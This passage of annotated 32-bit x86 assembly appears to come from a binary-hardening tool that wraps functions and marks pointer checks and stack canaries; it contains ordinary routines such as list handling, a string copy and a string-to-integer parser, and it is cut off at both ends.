   movsd   %xmm1, 0x8(%ebp)                   # [120(880)]Using Pointer PTRCHECK arg[1]    #32
   movsd   %xmm0, (%ebp)                      # [121(881)]Using Pointer PTRCHECK arg[1]    #32
   test    %ebx, %ebx                         # [122(882)]   #32
   je      Label_0x8048dd2 #32
   test    %ebp, %ebp                         # [124(884)]   #32
   je      Label_0x8048dd0 #32
   mov     (%ebp), %ecx                       # [126(886)]Using Pointer PTRCHECK arg[0]  Already checked [121]   #32
   mov     %ebx, %edx                         # [127(887)]   #32
Label_0x8048d90: #p6a
   mov     %edx, %eax                         # [128(888)]   #32
   cmp     %ecx, (%eax)                       # [129(889)]Using Pointer PTRCHECK arg[1]    #32
   jl      Label_0x8048da0 #32
   jne     Label_0x8048daf #32
   mov     0x4(%eax), %edx                    # [132(892)]Using Pointer PTRCHECK arg[0]    #32
   cmp     0x4(%ebp), %edx                    # [133(893)]Using Pointer PTRCHECK arg[0]  Already checked [133]   #32
   jge     Label_0x8048daf #32
Label_0x8048da0: #p6a
   mov     0x14(%eax), %edx                   # [135(895)]Using Pointer PTRCHECK arg[0]    #32
   test    %edx, %edx                         # [136(896)]   #32
   jne     Label_0x8048d90 #32
   mov     %ebp, 0x14(%eax)                   # [138(898)]Using Pointer PTRCHECK arg[1]  Already checked [135]   #32
   mov     %eax, 0x10(%ebp)                   # [139(899)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x8048dd0 #32
Label_0x8048daf: #p6a
   mov     0x10(%eax), %ecx                   # [141(901)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [142(902)]   #32
   je      Label_0x8048db9 #32
   mov     %ebp, 0x14(%ecx)                   # [144(904)]Using Pointer PTRCHECK arg[1]    #32
Label_0x8048db9: #p6a
   mov     %eax, 0x14(%ebp)                   # [145(905)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x10(%eax), %ecx                   # [146(906)]Using Pointer PTRCHECK arg[0]  Already checked [141]   #32
   mov     %ecx, 0x10(%ebp)                   # [147(907)]Using Pointer PTRCHECK arg[1]    #32
   mov     %ebp, 0x10(%eax)                   # [148(908)]Using Pointer PTRCHECK arg[1]  Already checked [146]   #32
   cmpl    $0x0, 0x10(%ebp)                   # [149(909)]Using Pointer PTRCHECK arg[1]  Already checked [147]   #32
   je      Label_0x8048dd2 #32
Label_0x8048dd0: #p6a
   mov     %ebx, %ebp                         # [151(911)]   #32
Label_0x8048dd2: #p6a
   mov     0x14(%edi), %edi                   # [152(912)]Using Pointer PTRCHECK arg[0]    #32
   test    %edi, %edi                         # [153(913)]   #32
   jne     Label_0x8048d30 #32
   test    %esi, %esi                         # [155(915)]   #32
   je      Label_0x8048e01 #32
Label_0x8048df0: #p6a
   mov     0x14(%esi), %edi                   # [157(917)]Using Pointer PTRCHECK arg[0]    #32
   mov     %esi, (%esp)                       # [158(918)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048df6
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %edi, %edi                         # [160(920)]   #32
   mov     %edi, %esi                         # [161(921)]# FLAGS USED   #32
   jne     Label_0x8048df0 #32
Label_0x8048e01: #p6a
   mov     Var_0x80602a8, %ecx                # [163(923)]   #32
   mov     $0x1, %edx                         # [164(924)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048e0c
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   mov     %eax, %edi                         # [166(926)]   #32
   mov     %edi, 0x4(%esp)                    # [167(927)]   #32
   mov     %ebp, (%esp)                       # [168(928)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048e1a
   .long    Func_0x8048100  #pp1w: Label_0x8048100 VAR_ADDRESS #32
   mov     %eax, %esi                         # [170(930)]   #32
   test    %edi, %edi                         # [171(931)]   #32
   je      Label_0x8048e41 #32
Label_0x8048e30: #p6a
   mov     0x14(%edi), %ebx                   # [173(933)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edi, (%esp)                       # [174(934)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048e36
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %ebx, %ebx                         # [176(936)]   #32
   mov     %ebx, %edi                         # [177(937)]# FLAGS USED   #32
   jne     Label_0x8048e30 #32
Label_0x8048e41: #p6a
   test    %ebp, %ebp                         # [179(939)]   #32
   je      Label_0x8048e61 #32
Label_0x8048e50: #p6a
   mov     0x14(%ebp), %edi                   # [181(941)]Using Pointer PTRCHECK arg[0]  Already checked [145]   #32
   mov     %ebp, (%esp)                       # [182(942)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048e56
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %edi, %edi                         # [184(944)]   #32
   mov     %edi, %ebp                         # [185(945)]# FLAGS USED   #32
   jne     Label_0x8048e50 #32
Label_0x8048e61: #p6a
   mov     Var_0x80602a8, %ecx                # [187(947)]   #32
   mov     $0x2, %edx                         # [188(948)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048e6c
   .long    Func_0x8048560  #pp1w: Label_0x8048560 VAR_ADDRESS #32
   mov     %eax, %ebp                         # [190(950)]   #32
   test    %ebp, %ebp                         # [191(951)]   #32
   mov     %ebp, 0x24(%esp)                   # [192(952)]# FLAGS USED   #32
   mov     0x18(%esp), %ebx                   # [193(953)]# FLAGS USED   #32
   je      Label_0x8048ec5 #32
Label_0x8048e80: #p6a
   mov     Var_0x80602a8, %ecx                # [195(955)]   #32
   movsd   (%ebp), %xmm0                      # [196(956)]Using Pointer PTRCHECK arg[0]    #32
   movsd   0x8(%ebp), %xmm1                   # [197(957)]Using Pointer PTRCHECK arg[0]    #32
   movsd   %xmm1, 0x8(%esp)                   # [198(958)]   #32
   movsd   %xmm0, (%esp)                      # [199(959)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048e9b
   .long    Func_0x8048310  #pp1w: Label_0x8048310 VAR_ADDRESS #32
   mov     0x14(%ebp), %ebp                   # [201(961)]Using Pointer PTRCHECK arg[0]    #32
   test    %ebp, %ebp                         # [202(962)]   #32
   jne     Label_0x8048e80 #32
   mov     0x24(%esp), %edi                   # [204(964)]   #32
   test    %edi, %edi                         # [205(965)]   #32
   je      Label_0x8048ec5 #32
Label_0x8048eb0: #p6a
   mov     %edi, %eax                         # [207(967)]   #32
   mov     0x14(%eax), %edi                   # [208(968)]Using Pointer PTRCHECK arg[0]    #32
   mov     %eax, (%esp)                       # [209(969)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x8048eb8
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   test    %edi, %edi                         # [211(971)]   #32
   jne     Label_0x8048eb0 #32
   mov     %edi, 0x24(%esp)                   # [213(973)]   #32
Label_0x8048ec5: #p6a
   add     %esi, %ebx                         # [214(974)]   #32
   mov     0x1c(%esp), %eax                   # [215(975)]   #32
   add     $0x1, %eax                         # [216(976)]   #32
   cmp     0x44(%esp), %eax                   # [217(977)]   #32
   lea     0x20(%esp), %ebp                   # [218(978)] Loading Pointer with stackSize: 60# FLAGS USED   #32
   jne     Label_0x8048bb0 #32
Label_0x8048eda: #p6a
   mov     %ebx, %eax                         # [220(980)]   #32
   add     $0x2c, %esp                        # [221(981)]stackSize = 0x10   #32
   pop     %esi                               # [222(982)]stackSize = 0xc   #32
   pop     %edi                               # [223(983)]stackSize = 0x8   #32
   pop     %ebx                               # [224(984)]stackSize = 0x4   #32
   pop     %ebp                               # [225(985)]stackSize = 0x0   #32
Label_0x8048ee3: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:68 Patched 0 in 0.002 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 69
     adding function wrapper

;     Start Index : 1421 (0x80494e0)
;       End Index : 1497 (0x80495ee)
;   Num Instructs : 77
;      Stack Size : 12 (0xc)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 8
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 2
;                 :  0x0(0xc), 0x8(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 12
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5720,7
.p2align 3,0x5725
FuncPtr_0x80494e0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x80494e0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x80494e0:

Label_0x80494e0:
   push    %ebp                               # [0(1421)]stackSize = 0x4   #32
   push    %ebx                               # [1(1422)]stackSize = 0x8   #32
   push    %edi                               # [2(1423)]stackSize = 0xc   #32
   push    %esi                               # [3(1424)]stackSize = 0x10   #32
   sub     $0xc, %esp                         # [4(1425)]stackSize = 0x1c   #32
   mov     %ecx, %esi                         # [5(1426)]   #32
   cmpl    $0x0, 0x20(%esi)                   # [6(1427)]Using Pointer PTRCHECK arg[1]    #32
   mov     $-0x1, %eax                        # [7(1428)]# FLAGS USED   #32
   je      Label_0x80495e7 #32
   mov     0x38(%esi), %ecx                   # [9(1430)]Using Pointer PTRCHECK arg[0]    #32
   cmpl    $0x0, 0x20(%ecx)                   # [10(1431)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x80495e7 #32
   mov     0x3c(%esi), %edx                   # [12(1433)]Using Pointer PTRCHECK arg[0]    #32
   cmpl    $0x0, 0x20(%edx)                   # [13(1434)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x80495e7 #32
   mov     0x40(%esi), %ebx                   # [15(1436)]Using Pointer PTRCHECK arg[0]    #32
   cmpl    $0x0, 0x20(%ebx)                   # [16(1437)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x80495e7 #32
   mov     0x44(%esi), %ebp                   # [18(1439)]Using Pointer PTRCHECK arg[0]    #32
   cmpl    $0x0, 0x20(%ebp)                   # [19(1440)]Using Pointer PTRCHECK arg[1]    #32
   jne     Label_0x80495e7 #32
   mov     0x8(%ecx), %edi                    # [21(1442)]Using Pointer PTRCHECK arg[0]    #32
   mov     %edi, 0x8(%esp)                    # [22(1443)]   #32
   mov     0x8(%esi), %edi                    # [23(1444)]Using Pointer PTRCHECK arg[0]    #32
   add     0x8(%esp), %edi                    # [24(1445)]   #32
   add     0x8(%edx), %edi                    # [25(1446)]Using Pointer PTRCHECK arg[0]    #32
   add     0x8(%ebx), %edi                    # [26(1447)]Using Pointer PTRCHECK arg[0]    #32
   add     0x8(%ebp), %edi                    # [27(1448)]Using Pointer PTRCHECK arg[0]    #32
   cmp     0x4(%esi), %edi                    # [28(1449)]Using Pointer PTRCHECK arg[0]    #32
   ja      Label_0x80495e7 #32
   mov     0xc(%ecx), %edx                    # [30(1451)]Using Pointer PTRCHECK arg[0]    #32
   mov     0x8(%esp), %eax                    # [31(1452)]   #32
   mov     %eax, (%esp)                       # [32(1453)]   #32
   mov     %esi, %ecx                         # [33(1454)]   #32
   call    Func_0x80495f0  #pp1: Label_0x80495f0 VAR_ADDRESS #32
   mov     0x3c(%esi), %eax                   # [35(1456)]Using Pointer PTRCHECK arg[0]  Already checked [12]   #32
   mov     0x8(%eax), %ecx                    # [36(1457)]Using Pointer PTRCHECK arg[0]    #32
   mov     0xc(%eax), %edx                    # [37(1458)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ecx, (%esp)                       # [38(1459)]   #32
   mov     %esi, %ecx                         # [39(1460)]   #32
   call    Func_0x80495f0  #pp1: Label_0x80495f0 VAR_ADDRESS #32
   mov     0x40(%esi), %eax                   # [41(1462)]Using Pointer PTRCHECK arg[0]  Already checked [15]   #32
   mov     0x8(%eax), %ecx                    # [42(1463)]Using Pointer PTRCHECK arg[0]    #32
   mov     0xc(%eax), %edx                    # [43(1464)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ecx, (%esp)                       # [44(1465)]   #32
   mov     %esi, %ecx                         # [45(1466)]   #32
   call    Func_0x80495f0  #pp1: Label_0x80495f0 VAR_ADDRESS #32
   mov     0x44(%esi), %eax                   # [47(1468)]Using Pointer PTRCHECK arg[0]  Already checked [18]   #32
   mov     0x8(%eax), %ecx                    # [48(1469)]Using Pointer PTRCHECK arg[0]    #32
   mov     0xc(%eax), %edx                    # [49(1470)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ecx, (%esp)                       # [50(1471)]   #32
   mov     %esi, %ecx                         # [51(1472)]   #32
   call    Func_0x80495f0  #pp1: Label_0x80495f0 VAR_ADDRESS #32
   mov     0x38(%esi), %eax                   # [53(1474)]Using Pointer PTRCHECK arg[0]  Already checked [9]   #32
   mov     %eax, (%esp)                       # [54(1475)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804959c
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   mov     0x3c(%esi), %eax                   # [56(1477)]Using Pointer PTRCHECK arg[0]  Already checked [35]   #32
   mov     %eax, (%esp)                       # [57(1478)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80495a7
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   mov     0x40(%esi), %eax                   # [59(1480)]Using Pointer PTRCHECK arg[0]  Already checked [41]   #32
   mov     %eax, (%esp)                       # [60(1481)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80495b2
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   mov     0x44(%esi), %eax                   # [62(1483)]Using Pointer PTRCHECK arg[0]  Already checked [47]   #32
   mov     %eax, (%esp)                       # [63(1484)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x80495bd
   .long    Func_0x804a500  #pp1w: Label_0x804a500 VAR_ADDRESS #32
   movl    $0x0, 0x38(%esi)                   # [65(1486)]Using Pointer PTRCHECK arg[1]  Already checked [53]   #32
   movl    $0x0, 0x3c(%esi)                   # [66(1487)]Using Pointer PTRCHECK arg[1]  Already checked [56]   #32
   movl    $0x0, 0x40(%esi)                   # [67(1488)]Using Pointer PTRCHECK arg[1]  Already checked [59]   #32
   movl    $0x0, 0x44(%esi)                   # [68(1489)]Using Pointer PTRCHECK arg[1]  Already checked [62]   #32
   movl    $0x0, 0x20(%esi)                   # [69(1490)]Using Pointer PTRCHECK arg[1]  Already checked [6]   #32
   xor     %eax, %eax                         # [70(1491)]   #32
Label_0x80495e7: #p6a
   add     $0xc, %esp                         # [71(1492)]stackSize = 0x10   #32
   pop     %esi                               # [72(1493)]stackSize = 0xc   #32
   pop     %edi                               # [73(1494)]stackSize = 0x8   #32
   pop     %ebx                               # [74(1495)]stackSize = 0x4   #32
   pop     %ebp                               # [75(1496)]stackSize = 0x0   #32
Label_0x80495ee: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:69 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 70
     adding function wrapper

;     Start Index : 2280 (0x804a320)
;       End Index : 2295 (0x804a34a)
;   Num Instructs : 16
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6720,7
.p2align 3,0x6725
FuncPtr_0x804a320:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a320,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a320:

Label_0x804a320:
   push    %esi                               # [0(2280)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2281)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2282)]   #32
   mov     %esi, (%esp)                       # [3(2283)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804a32b
   .long    Func_0x804a350  #pp1w: Label_0x804a350 VAR_ADDRESS #32
   test    %eax, %eax                         # [5(2285)]   #32
   mov     $0x1, %al                          # [6(2286)]# FLAGS USED   #32
   jne     Label_0x804a343 #32
   mov     %esi, (%esp)                       # [8(2288)]   #32
   call    Func_0x804a380  #pp1: Label_0x804a380 VAR_ADDRESS #32
   test    %eax, %eax                         # [10(2290)]   #32
   setne   %al                                # [11(2291)]   #32
Label_0x804a343: #p6a
   movzbl  %al, %eax                          # [12(2292)]   #32
   add     $0x8, %esp                         # [13(2293)]stackSize = 0x4   #32
   pop     %esi                               # [14(2294)]stackSize = 0x0   #32
Label_0x804a34a: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:70 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 94   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 3628 (0x804b3c0)
;       End Index : 3653 (0x804b409)
;   Num Instructs : 26
;      Stack Size : 0 (0x0)
;          Pushes : 2 (0x2)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 3
;      ESP Params : 
;                 :  0xc(0x4), 0x10(0x4), 0x14(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x020,7
.p2align 3,0x025
FuncPtr_0x804b3c0:

Func_0x804b3c0:

Label_0x804b3c0:
   push    %ebx                               # [0(3628)]stackSize = 0x4   #32
   push    %esi                               # [1(3629)]stackSize = 0x8   #32
   xor     %edx, %edx                         # [2(3630)]   #32
   mov     0x14(%esp), %ecx                   # [3(3631)]   #32
   mov     0xc(%esp), %eax                    # [4(3632)]   #32
   test    %ecx, %ecx                         # [5(3633)]   #32
   je      Label_0x804b3ef #32
   mov     0x10(%esp), %esi                   # [7(3635)]   #32
Label_0x804b3e0: #p6a
   mov     (%esi, %edx ,  0x1), %bl           # [8(3636)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   test    %bl, %bl                           # [9(3637)]   #32
   mov     %bl, (%eax, %edx ,  0x1)           # [10(3638)]Using Pointer PTRCHECK arg[1] # FLAGS USED   # <<<=== Need to Address an Array
   je      Label_0x804b3ef #32
   add     $0x1, %edx                         # [12(3640)]   #32
   cmp     %ecx, %edx                         # [13(3641)]   #32
   jb      Label_0x804b3e0 #32
Label_0x804b3ef: #p6a
   cmp     %ecx, %edx                         # [15(3643)]   #32
   jae     Label_0x804b407 #32
   lea     (%eax, %edx ,  0x1), %esi          # [17(3645)] Loading Pointer with stackSize: 8   # <<<=== Need to Address an Array
   sub     %edx, %ecx                         # [18(3646)]   #32
Label_0x804b400: #p6a
   movb    $0x0, (%esi)                       # [19(3647)]Using Pointer PTRCHECK arg[1]    #32
   add     $0x1, %esi                         # [20(3648)]   #32
   sub     $0x1, %ecx                         # [21(3649)]# FLAGS USED   #32
   jne     Label_0x804b400 #32
Label_0x804b407: #p6a
   pop     %esi                               # [23(3651)]stackSize = 0x4   #32
   pop     %ebx                               # [24(3652)]stackSize = 0x0   #32
Label_0x804b409: #p6a
   ret     #32
 # Ret here

/*;;;;;;;; 
; id:94 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 60   [[ SAFE FUNCTION ]]
     adding function wrapper

;     Start Index : 3699 (0x804b470)
;       End Index : 3815 (0x804b5a0)
;   Num Instructs : 117
;      Stack Size : 8 (0x8)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 4
;                 :  0x4(0x4),
;      ESP Params : 
;                 :  0x1c(0x4), 0x20(0x4), 0x24(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 5
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x7520,7
.p2align 3,0x7525
FuncPtr_0x804b470:

Func_0x804b470:

Label_0x804b470:
   push    %ebp                               # [0(3699)]stackSize = 0x4   #32
   push    %ebx                               # [1(3700)]stackSize = 0x8   #32
   push    %edi                               # [2(3701)]stackSize = 0xc   #32
   push    %esi                               # [3(3702)]stackSize = 0x10   #32
   sub     $0x8, %esp                         # [4(3703)]stackSize = 0x18   #32
   xor     %eax, %eax                         # [5(3704)]   #32
   mov     0x24(%esp), %esi                   # [6(3705)]   #32
   mov     0x1c(%esp), %ecx                   # [7(3706)]   #32
   cmp     $0x1, %esi                         # [8(3707)]   #32
   je      Label_0x804b48b #32
   cmp     $0x24, %esi                        # [10(3709)]   #32
   jle     Label_0x804b4a6 #32
Label_0x804b48b: #p6a
   xor     %ebx, %ebx                         # [12(3711)]   #32
   mov     %ecx, %edx                         # [13(3712)]   #32
Label_0x804b48f: #p6a
   mov     0x20(%esp), %esi                   # [14(3713)]   #32
   test    %esi, %esi                         # [15(3714)]   #32
   je      Label_0x804b49e #32
   test    %ebx, %ebx                         # [17(3716)]   #32
   cmovg   %edx, %ecx                         # [18(3717)]   #32
   mov     %ecx, (%esi)                       # [19(3718)]Using Pointer PTRCHECK arg[1]    #32
Label_0x804b49e: #p6a
   add     $0x8, %esp                         # [20(3719)]stackSize = 0x10   #32
   pop     %esi                               # [21(3720)]stackSize = 0xc   #32
   pop     %edi                               # [22(3721)]stackSize = 0x8   #32
   pop     %ebx                               # [23(3722)]stackSize = 0x4   #32
   pop     %ebp                               # [24(3723)]stackSize = 0x0   #32
Label_0x804b4a5: #p6a
   ret     #32
 # Ret here
Label_0x804b4a6: #p6a
   test    %esi, %esi                         # [26(3725)]   #32
   mov     $0x0, %ebx                         # [27(3726)]# FLAGS USED   #32
   mov     %ecx, %edx                         # [28(3727)]# FLAGS USED   #32
   js      Label_0x804b48f #32
   mov     %ecx, %edx                         # [30(3729)]   #32
   jmp     Label_0x804b4c1 #32
Label_0x804b4c0: #p6a
   add     $0x1, %edx                         # [32(3731)]   #32
Label_0x804b4c1: #p6a
   mov     (%edx), %al                        # [33(3732)]Using Pointer PTRCHECK arg[0]    #32
   mov     %al, %ah                           # [34(3733)]   #32
   add     $0xf7, %ah                         # [35(3734)]   #32
   cmp     $0x4, %ah                          # [36(3735)]   #32
   jb      Label_0x804b4c0 #32
   cmp     $0x2d, %al                         # [38(3737)]   #32
   je      Label_0x804b4d9 #32
   xor     %ecx, %ecx                         # [40(3739)]   #32
   cmp     $0x20, %al                         # [41(3740)]   #32
   je      Label_0x804b4c0 #32
   jmp     Label_0x804b4df #32
Label_0x804b4d9: #p6a
   add     $0x1, %edx                         # [44(3743)]   #32
   mov     $0x1, %ecx                         # [45(3744)]   #32
Label_0x804b4df: #p6a
   cmpb    $0x2b, (%edx)                      # [46(3745)]Using Pointer PTRCHECK arg[1]  Already checked [33]   #32
   jne     Label_0x804b4eb #32
   mov     %ecx, 0x4(%esp)                    # [48(3747)]   #32
   add     $0x1, %edx                         # [49(3748)]   #32
   jmp     Label_0x804b4ef #32
Label_0x804b4eb: #p6a
   mov     %ecx, 0x4(%esp)                    # [51(3750)]   #32
Label_0x804b4ef: #p6a
   cmp     $0x10, %esi                        # [52(3751)]   #32
   jne     Label_0x804b50c #32
   cmpb    $0x30, (%edx)                      # [54(3753)]Using Pointer PTRCHECK arg[1]  Already checked [46]   #32
   mov     $0x10, %esi                        # [55(3754)]# FLAGS USED   #32
   jne     Label_0x804b533 #32
   mov     0x1(%edx), %al                     # [57(3756)]Using Pointer PTRCHECK arg[0]    #32
   or      $0x20, %al                         # [58(3757)]   #32
   cmp     $0x78, %al                         # [59(3758)]   #32
   jne     Label_0x804b533 #32
   add     $0x2, %edx                         # [61(3760)]   #32
   jmp     Label_0x804b533 #32
Label_0x804b50c: #p6a
   test    %esi, %esi                         # [63(3762)]   #32
   jne     Label_0x804b533 #32
   cmpb    $0x30, (%edx)                      # [65(3764)]Using Pointer PTRCHECK arg[1]  Already checked [46]   #32
   mov     $0xa, %esi                         # [66(3765)]# FLAGS USED   #32
   jne     Label_0x804b533 #32
   mov     0x1(%edx), %al                     # [68(3767)]Using Pointer PTRCHECK arg[0]    #32
   or      $0x20, %al                         # [69(3768)]   #32
   cmp     $0x78, %al                         # [70(3769)]   #32
   jne     Label_0x804b52d #32
   add     $0x2, %edx                         # [72(3771)]   #32
   mov     $0x10, %esi                        # [73(3772)]   #32
   jmp     Label_0x804b533 #32
Label_0x804b52d: #p6a
   mov     $0x8, %esi                         # [75(3774)]   #32
   add     $0x1, %edx                         # [76(3775)]   #32
Label_0x804b533: #p6a
   xor     %ebp, %ebp                         # [77(3776)]   #32
   xor     %ebx, %ebx                         # [78(3777)]   #32
   mov     $-0x41, %edi                       # [79(3778)]   #32
   jmp     Label_0x804b546 #32
   xchg    %ax, %ax                           # [81(3780)]   #32
Label_0x804b540: #p6a
   imul    %esi, %ebp                         # [82(3781)]   #32
   add     %eax, %ebp                         # [83(3782)]   #32
   add     $0x1, %ebx                         # [84(3783)]   #32
Label_0x804b546: #p6a
   mov     (%edx, %ebx ,  0x1), %al           # [85(3784)]Using Pointer PTRCHECK arg[0]    # <<<=== Need to Address an Array
   mov     %al, %ah                           # [86(3785)]   #32
   add     $0xd0, %ah                         # [87(3786)]   #32
   cmp     $0xa, %ah                          # [88(3787)]   #32
   jae     Label_0x804b560 #32
   movsbl  (%edx, %ebx ,  0x1), %eax          # [90(3789)]Using Pointer PTRCHECK arg[0]  Already checked [85]   # <<<=== Need to Address an Array
   add     $-0x30, %eax                       # [91(3790)]   #32
   jmp     Label_0x804b582 #32
Label_0x804b560: #p6a
   mov     %al, %ah                           # [93(3792)]   #32
   add     $0xbf, %ah                         # [94(3793)]   #32
   cmp     $0x1a, %ah                         # [95(3794)]   #32
   jae     Label_0x804b588 #32
Label_0x804b56a: #p6a
   movsbl  (%edx, %ebx ,  0x1), %eax          # [97(3796)]Using Pointer PTRCHECK arg[0]  Already checked [85]   # <<<=== Need to Address an Array
   mov     %al, %cl                           # [98(3797)]   #32
   add     $0xbf, %cl                         # [99(3798)]   #32
   cmp     $0x1a, %cl                         # [100(3799)]   #32
   mov     $-0x61, %ecx                       # [101(3800)]# FLAGS USED   #32
   cmovb   %edi, %ecx                         # [102(3801)]   #32
   lea     0xa(%eax, %ecx ,  0x1), %eax       # [103(3802)] Loading Pointer with stackSize: 24   # <<<=== Need to Address an Array
Label_0x804b582: #p6a
   cmp     %esi, %eax                         # [104(3803)]   #32
   jl      Label_0x804b540 #32
   jmp     Label_0x804b58e #32
Label_0x804b588: #p6a
   add     $0x9f, %al                         # [107(3806)]   #32
   cmp     $0x1a, %al                         # [108(3807)]   #32
   jb      Label_0x804b56a #32
Label_0x804b58e: #p6a
   mov     %ebp, %eax                         # [110(3809)]   #32
   neg     %eax                               # [111(3810)]   #32
   cmpl    $0x0, 0x4(%esp)                    # [112(3811)]   #32
   cmove   %ebp, %eax                         # [113(3812)]   #32
   add     %ebx, %edx                         # [114(3813)]   #32
   mov     0x1c(%esp), %ecx                   # [115(3814)]   #32
   jmp     Label_0x804b48f #32

/*;;;;;;;; 
; id:60 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 73
     adding function wrapper

;     Start Index : 2403 (0x804a4d0)
;       End Index : 2415 (0x804a4f0)
;   Num Instructs : 13
;      Stack Size : 8 (0x8)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 2
;                 :  0x0(0x8),
;      ESP Params : 
;                 :  0x10(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6620,7
.p2align 3,0x6625
FuncPtr_0x804a4d0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804a4d0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804a4d0:

Label_0x804a4d0:
   push    %esi                               # [0(2403)]stackSize = 0x4   #32
   sub     $0x8, %esp                         # [1(2404)]stackSize = 0xc   #32
   mov     0x14(%esp), %esi                   # [2(2405)]   #32
   mov     %esi, (%esp)                       # [3(2406)]   #32
   call    Func_0x804a390  #pp1: Label_0x804a390 VAR_ADDRESS #32
   mov     %esi, %ecx                         # [5(2408)]   #32
   and     $0x5f, %ecx                        # [6(2409)]   #32
   test    %eax, %eax                         # [7(2410)]   #32
   cmove   %esi, %ecx                         # [8(2411)]   #32
   mov     %ecx, %eax                         # [9(2412)]   #32
   add     $0x8, %esp                         # [10(2413)]stackSize = 0x4   #32
   pop     %esi                               # [11(2414)]stackSize = 0x0   #32
Label_0x804a4f0: #p6a
